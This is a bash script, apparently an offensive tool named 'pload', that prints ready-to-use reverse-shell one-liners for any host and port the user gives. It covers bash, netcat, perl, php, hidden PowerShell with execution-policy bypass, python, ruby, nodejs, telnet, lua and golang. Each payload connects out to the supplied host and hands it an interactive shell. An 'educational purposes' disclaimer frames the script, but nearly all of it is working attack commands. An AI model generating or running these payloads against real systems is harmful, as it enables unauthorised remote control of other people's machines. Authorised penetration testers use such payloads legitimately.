#!/bin/bash

clear

RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
BLUE="$(printf '\033[34m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
RESETBG="$(printf '\e[0m\n')"
WHITEBG="$(printf '\033[47m')"

cat << EOF

Message From - [ ${RED}jungawagat${WHITE} ] :

As the creator of this tool [ ${GREEN}pload${WHITE} ]
I hereby declare that I will not be held responsible for any misuse of this tool
This tool was created solely for educational purposes and as a personal project
The user of this tool assumes all legal responsibilities associated with its use !

EOF

read -p "${WHITE}[**] Do You Accept The Terms ?? [${RED}yes${WHITE}] ~> " answer
if [ $answer != "yes" ] ; then
echo "${RED}"
echo "[**] What A Waste Of Words : Quitting !"
echo ""
exit
fi

cat << EOF

${GREEN}d8888b  db        d88b     d8b   d8888b
${GREEN}88   8D 88       8P  Y8  d8   8b 88   8D
${GREEN}88oodD  88      88    88 88ooo88 88   88
${GREEN}88ooD   88      88    88 88ooo88 88   88
${GREEN}88      88boooo  8b  d8  88   88 88   8D
${GREEN}88      Y88888P   Y88P   YP   YP Y8888D

${WHITEBG}${RED}- https://github.com/jungawagat/pload -${RESETBG}
EOF

type=$1
host=$2
port=$3

echo ""

if [[ -z $type || -z $host || -z $port ]] ; then
echo "[ USAGE ] : ${RED}./pload.sh <type> <host> <port> !"
echo ""
exit
fi

if [[ "$type" == "bash" ]] ; then
echo "[ PLOAD ] : ${RED}sh -i >& /dev/tcp/$2/$3 0>&1"
echo ""
elif [[ "$type" == "netcat" ]] ; then
echo "[ PLOAD ] : ${RED}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $2 $3 >/tmp/f"
echo ""
elif [[ "$type" == "perl" ]] ; then
echo "[ PLOAD ] : ${RED}perl -e 'use Socket;\$i=\"$2\";\$p=$3;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'"
echo ""
elif [[ "$type" == "php" ]] ; then
echo "[ PLOAD ] : ${RED}php -r '\$sock=fsockopen(\"$2\",$3);exec(\"sh <&3 >&3 2>&3\");'"
echo ""
elif [[ "$type" == "powershell" ]] ; then
echo "[ PLOAD ] : ${RED}powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$2\",$3);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex $data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
echo ""
elif [[ "$type" == "python" ]] ; then
echo "[ PLOAD ] : ${RED}export RHOST=\"$2\";export RPORT=$3;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'"
echo ""
elif [[ "$type" == "python3" ]] ; then
echo "[ PLOAD ] : ${RED}export RHOST=\"$2\";export RPORT=$3;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'"
echo ""
elif [[ "$type" == "ruby" ]] ; then
echo "[ PLOAD ] : ${RED}ruby -rsocket -e 'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"$2\",$3))'"
echo ""
elif [[ "$type" == "nodejs" ]] ; then
echo "[ PLOAD ] : ${RED}require('child_process').exec('nc -e sh $2 $3')"
echo ""
elif [[ "$type" == "telnet" ]] ; then
echo "[ PLOAD ] : ${RED}TF=\$(mktemp -u);mkfifo \$TF && telnet $2 $3 0<\$TF | sh 1>\$TF"
echo ""
elif [[ "$type" == "lua" ]] ; then
echo "[ PLOAD ] : ${RED}lua -e \"require('socket');require('os');t=socket.tcp();t:connect('$2','$3');os.execute('sh -i <&3 >&3 2>&3');\""
echo ""
elif [[ "$type" == "golang" ]] ; then
echo "[ PLOAD ] : ${RED}echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$2:$3\");cmd:=exec.Command(\"sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
echo ""
else
echo "[ TYPE ] : ${BLUE}bash , netcat , perl , php , powershell , python , python3 , ruby , nodejs , telnet , lua , golang"
echo ""
fi
